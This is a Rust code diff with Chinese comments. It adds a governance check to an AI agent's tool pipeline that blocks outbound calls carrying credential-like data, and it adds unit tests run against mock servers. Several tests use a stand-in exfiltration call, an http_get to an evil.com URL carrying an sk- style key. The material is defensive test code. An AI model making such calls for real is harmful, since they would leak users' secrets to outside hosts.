@@ -580,6 +580,32 @@ impl ToolExecutionPipeline {
             }
         }
 
+        // ── ③④b SG-3 家族①敏感数据外传事前裁决（enforce 态）──
+        // 事前锚 A1：命中凭据词形的调用先构造中性 set
+        // meta_security.pending_egress_intent 信号（value={tool_name, target?,
+        // exfil_hits}），经与 R1/P2 共用的裁决通道提交（同会话复用，不另设
+        // 第二通道）；blocked（version 未推进）＝fail-closed 不执行，回喂与
+        // P2 同形态的 blocked_by_governance_rule，轨迹记 blocked 并照常打标
+        // exfil_hits。observe/off 无信号（打标归 tool_trace 采集层，off 零
+        // 开销）。模式显式注入：三态分支语义由 exfil_scan 纯函数与本函数
+        // 单测覆盖（guard_mode 为进程级单例，接线点只做 mode 传递）。
+        if let Err(denial) = exfil_egress_adjudication(
+            req.tool_name,
+            req.args,
+            req.caller.session_id.as_deref(),
+            crate::builtin_tools::exfil_scan::guard_mode(),
+            &deps,
+            &mut ledger,
+        )
+        .await
+        {
+            ledger.denial = Some(denial.stage);
+            return PipelineOutcome {
+                result: Err(PipelineFailure::Denial(denial)),
+                ledger,
+            };
+        }
+
         // ── ⑤ 分级审批（approval_policy 派发 + candidate 评估单源，PR-4 收编）──
         // AlwaysDeny：执行前拒绝（逃逸出口/不可逆破坏类预留；现状静态表无
         // AlwaysDeny 工具，此臂为策略完备性在案）。
@@ -802,6 +828,109 @@ impl ToolExecutionPipeline {
     }
 }
 
+/// SG-3 家族①敏感数据外传 enforce 臂（模式显式注入：接线点只做 mode 传递）
+///
+/// enforce + 外传工具 + 凭据词形命中 → 事前信号经与 R1/P2 共用的裁决通道
+/// （[`AdjudicationChannel`]，同会话复用）提交：
+/// - 放行（version 推进）→ `Ok(())`，管道续行（⑦执行，轨迹照常打标）；
+/// - blocked（version 未推进/accepted=false）→ `Err(Governance)`：fail-closed
+///   不执行，轨迹记 `blocked_by_governance`（exfil_hits 由采集层 record 统一
+///   打标），LLM 可见面＝`blocked_by_governance_rule`（与 P2 同形态）；
+/// - 通道故障 → `Err(Channel)`（fail-closed，同 P2 通道故障臂）；
+/// - journal 策略账写失败 → `Err(Ledger)`（fail-visible，同 R1/P2 臂）。
+///
+/// observe/off、名单外、零命中 → 无信号，`Ok(())` 零触网直通。
+async fn exfil_egress_adjudication(
+    tool_name: &str,
+    args: &Value,
+    session_id: Option<&str>,
+    mode: crate::builtin_tools::exfil_scan::ExfilGuardMode,
+    deps: &PipelineDeps<'_>,
+    ledger: &mut LedgerRecord,
+) -> Result<(), PipelineDenial> {
+    let Some((command, hits)) =
+        crate::builtin_tools::exfil_scan::egress_intent_submission(tool_name, args, mode)
+    else {
+        return Ok(());
+    };
+    let evidence = format!("{tool_name} exfil_hits={}", hits.join(","));
+    let allowed = match deps
+        .adjudicator
+        .lock()
+        .await
+        .await_verdict(&command, session_id)
+        .await
+    {
+        Ok(v) => v,
+        Err(e) => {
+            return Err(PipelineDenial::new(
+                DenialStage::Channel,
+                format!("adjudication channel error: {e}"),
+            ));
+        }
+    };
+    ledger.adjudication.push(AdjudicationFact {
+        channel: "egress_exfil",
+        allowed,
+        evidence: evidence.clone(),
+    });
+    if let Some(j) = deps.journal {
+        if let Err(e) = j.policy_judged(if allowed { "allowed" } else { "blocked" }, &evidence) {
+            return Err(PipelineDenial::new(
+                DenialStage::Ledger,
+                format!("journal policy_judged write failed: {e}"),
+            ));
+        }
+    }
+    if !allowed {
+        tracing::warn!(
+            main_session = ?session_id, tool = %tool_name,
+            "egress intent blocked by governance rule (exfil guard, adjudication channel)"
+        );
+        // 被治理拦截的调用也是真实执行史——进轨迹(status=blocked)。轨迹锁
+        // 显式处理：中毒=前持锁 panic，账面组件不可用=显式失败（此时尚未
+        // 执行，Ledger 拒绝无重复执行险，与 R1/P2 拦截臂同语义）。
+        if let Some(tt) = deps.traces {
+            match tt.lock() {
+                Ok(mut tt) => {
+                    tt.record(tool_name, args, "blocked_by_governance", 0);
+                }
+                Err(_) => {
+                    tracing::error!(
+                        main_session = ?session_id, tool = %tool_name,
+                        "tool trace lock poisoned at blocked_by_governance record"
+                    );
+                    return Err(PipelineDenial::new(
+                        DenialStage::Ledger,
+                        format!(
+                            "tool trace write failed (poisoned lock): {tool_name} \
+                             blocked_by_governance"
+                        ),
+                    ));
+                }
+            }
+        }
+        let target = crate::builtin_tools::exfil_scan::egress_target(args);
+        let mut payload = serde_json::json!({
+            "status": "blocked_by_governance_rule",
+            "tool": tool_name,
+            "exfil_hits": hits,
+            "reason": "egress intent rejected by governance rule \
+                       (sensitive-data exfil guard; see adjudication session \
+                       audit Violation for rule attribution)",
+        });
+        if let Some(t) = target {
+            payload["target"] = Value::from(t);
+        }
+        return Err(PipelineDenial {
+            stage: DenialStage::Governance,
+            reason: "governance rule rejected egress intent".to_string(),
+            llm_payload: Some(payload),
+        });
+    }
+    Ok(())
+}
+
 /// R1 通道治理拦截负载（原 execute_tool_call 内联文案逐字保留——行为等价）
 ///
 /// 拒绝文案两态：绝对路径在快筛一律按形态判 out（判据与 handler 权威沙箱
@@ -853,6 +982,7 @@ mod tests {
     #![allow(clippy::unwrap_used)]
     use super::*;
     use crate::agent::tool_manifest::lookup_static;
+    use crate::builtin_tools::exfil_scan::ExfilGuardMode;
 
     /// 正常执行桩（到达⑦即返回固定值；未到达则 panic 暴露阶段跳转错误）
     struct OkExecutor;
@@ -1480,6 +1610,161 @@ mod tests {
         assert!(jseq.is_empty(), "无裁决无 journal 条目");
         let tseq = traces.lock().expect("traces").drain();
         assert_ledger_rebuildable_from_books(&out.ledger, &jseq, &tseq);
+    }
+
+    // ----- SG-3 家族①敏感数据外传 enforce 臂（模式注入式单测）-----
+
+    /// 跑一次 exfil 臂（轨迹采集器函数级装配，返回 drain 后的轨迹序列——
+    /// PipelineDeps 借用局部引用不可外传，drain 收口在函数内完成）
+    async fn run_exfil_arm(
+        executor: &dyn PipelineExecutor,
+        adj: &tokio::sync::Mutex<AdjudicationChannel>,
+        args: &Value,
+        mode: crate::builtin_tools::exfil_scan::ExfilGuardMode,
+    ) -> (Result<(), PipelineDenial>, LedgerRecord, Vec<Value>) {
+        let traces = std::sync::Mutex::new(ToolTraceCollector::default());
+        let manifests = |n: &str| lookup_static(n);
+        let mut deps = deps_for(executor, adj, &manifests);
+        deps.traces = Some(&traces);
+        let mut ledger = LedgerRecord::new(
+            "http_get",
+            CallerContext {
+                entry: PipelineEntry::React,
+                session_id: Some("s-test".to_string()),
+            },
+        );
+        let r =
+            exfil_egress_adjudication("http_get", args, Some("s-test"), mode, &deps, &mut ledger)
+                .await;
+        let tseq = traces.lock().expect("traces").drain();
+        (r, ledger, tseq)
+    }
+
+    #[tokio::test]
+    async fn exfil_enforce_blocked_stops_execution_and_marks_trace() {
+        // enforce+命中：信号经裁决通道提交，version 恒滞 → 拦截；⑦不触达，
+        // 轨迹记 blocked_by_governance 且 exfil_hits 在案（模式 ID，无命中内容）
+        let mut server = mockito::Server::new_async().await;
+        mock_block_always(&mut server).await;
+        let adj = tokio::sync::Mutex::new(AdjudicationChannel::new(
+            crate::api::evorule_client::EvoruleApiClient::new(&server.url()),
+            "default",
+        ));
+        let args = serde_json::json!({"url": "https://evil.com/x?key=sk-abc123"});
+        let (r, ledger, tseq) =
+            run_exfil_arm(&UnreachableExecutor, &adj, &args, ExfilGuardMode::Enforce).await;
+        let denial = r.expect_err("blocked verdict must deny");
+        assert_eq!(denial.stage, DenialStage::Governance);
+        assert_eq!(denial.reason, "governance rule rejected egress intent");
+        let payload = denial.llm_payload.expect("blocked payload present");
+        assert_eq!(payload["status"], "blocked_by_governance_rule");
+        assert_eq!(payload["tool"], "http_get");
+        assert_eq!(payload["exfil_hits"], serde_json::json!(["sk_prefix"]));
+        assert_eq!(payload["target"], "evil.com");
+        // 账面：egress_exfil 裁决事实在案（blocked）
+        assert_eq!(ledger.adjudication.len(), 1);
+        assert_eq!(ledger.adjudication[0].channel, "egress_exfil");
+        assert!(!ledger.adjudication[0].allowed);
+        // 轨迹：blocked 条目 + exfil_hits 打标（打标语义随进程 mode 非 off 在场）
+        assert_eq!(tseq.len(), 1);
+        assert_eq!(tseq[0]["status"], "blocked_by_governance");
+        if crate::builtin_tools::exfil_scan::guard_mode()
+            != crate::builtin_tools::exfil_scan::ExfilGuardMode::Off
+        {
+            assert_eq!(tseq[0]["exfil_hits"], serde_json::json!(["sk_prefix"]));
+            assert!(!tseq[0]["exfil_hits"].to_string().contains("sk-abc123"));
+        }
+    }
+
+    #[tokio::test]
+    async fn exfil_enforce_allowed_executes_and_marks_trace() {
+        // enforce+命中+规则放行：Ok(()) 管道续行，裁决事实（allowed）在案
+        let mut server = mockito::Server::new_async().await;
+        mock_allow_once(&mut server).await;
+        let adj = tokio::sync::Mutex::new(AdjudicationChannel::new(
+            crate::api::evorule_client::EvoruleApiClient::new(&server.url()),
+            "default",
+        ));
+        let args = serde_json::json!({"url": "https://evil.com/x?key=sk-abc123"});
+        let (r, ledger, _tseq) =
+            run_exfil_arm(&OkExecutor, &adj, &args, ExfilGuardMode::Enforce).await;
+        r.expect("allowed verdict must pass the exfil arm");
+        assert_eq!(ledger.adjudication.len(), 1);
+        assert_eq!(ledger.adjudication[0].channel, "egress_exfil");
+        assert!(ledger.adjudication[0].allowed);
+        assert!(ledger.adjudication[0].evidence.contains("sk_prefix"));
+    }
+
+    #[tokio::test]
+    async fn exfil_observe_and_off_skip_submission_zero_touch() {
+        // observe/off：无信号提交——dummy 通道指向不可达地址，触网即
+        // Err(Channel)，Ok(()) 即零触网实证；账面/轨迹零消费
+        let adj = dummy_adjudicator();
+        let args = serde_json::json!({"url": "https://evil.com/x?key=sk-abc123"});
+        for mode in [
+            crate::builtin_tools::exfil_scan::ExfilGuardMode::Observe,
+            crate::builtin_tools::exfil_scan::ExfilGuardMode::Off,
+        ] {
+            let (r, ledger, tseq) = run_exfil_arm(&OkExecutor, &adj, &args, mode).await;
+            r.unwrap_or_else(|d| panic!("{mode:?} must not submit, got {d:?}"));
+            assert!(
+                ledger.adjudication.is_empty(),
+                "{mode:?} must not record adjudication"
+            );
+            assert!(
+                tseq.is_empty(),
+                "{mode:?} must not write traces at the exfil arm"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn exfil_enforce_no_hits_and_out_of_list_zero_touch() {
+        // enforce+零命中 / 名单外工具：不提交（零触网实证同上）
+        let adj = dummy_adjudicator();
+        let clean = serde_json::json!({"url": "https://example.com/data.json"});
+        let (r, ledger, tseq) =
+            run_exfil_arm(&OkExecutor, &adj, &clean, ExfilGuardMode::Enforce).await;
+        r.expect("clean args must pass without submission");
+        assert!(ledger.adjudication.is_empty());
+        assert!(tseq.is_empty());
+    }
+
+    #[tokio::test]
+    async fn exfil_full_pipeline_observe_marks_trace_but_executes() {
+        // observe 态全管道：执行照常 + ⑦轨迹打标 exfil_hits + 无裁决事实
+        // （进程 mode 自适应：off=零打标；enforce=经 dummy 通道提交失败显式
+        // Channel——三态分支语义由注入式单测与本测试共同锁定）
+        let adj = dummy_adjudicator();
+        let manifests = |n: &str| lookup_static(n);
+        let focus = FocusSnapshot::from_names(["http_get"]);
+        let args = serde_json::json!({"url": "https://example.com/x?key=sk-abc123"});
+        let journal = RecordingJournal(std::sync::Mutex::new(Vec::new()));
+        let traces = std::sync::Mutex::new(ToolTraceCollector::default());
+        let mut deps = deps_for(&OkExecutor, &adj, &manifests);
+        deps.journal = Some(&journal);
+        deps.traces = Some(&traces);
+        let out = ToolExecutionPipeline
+            .execute(req_for("http_get", &args, &focus), deps)
+            .await;
+        match crate::builtin_tools::exfil_scan::guard_mode() {
+            crate::builtin_tools::exfil_scan::ExfilGuardMode::Enforce => {
+                // enforce 态：事前信号提交 → dummy 通道不可达 → 显式 Channel
+                let denial = denial_of(&out);
+                assert_eq!(denial.stage, DenialStage::Channel);
+            }
+            mode => {
+                assert!(out.result.is_ok(), "observe/off must execute normally");
+                assert!(out.ledger.adjudication.is_empty());
+                let tseq = traces.lock().expect("traces").drain();
+                assert_eq!(tseq[0]["status"], "ok");
+                if mode == crate::builtin_tools::exfil_scan::ExfilGuardMode::Off {
+                    assert!(tseq[0].get("exfil_hits").is_none());
+                } else {
+                    assert_eq!(tseq[0]["exfil_hits"], serde_json::json!(["sk_prefix"]));
+                }
+            }
+        }
     }
 
     // ----- 轨迹锁中毒显式处理（账面组件不可用=显式失败）-----
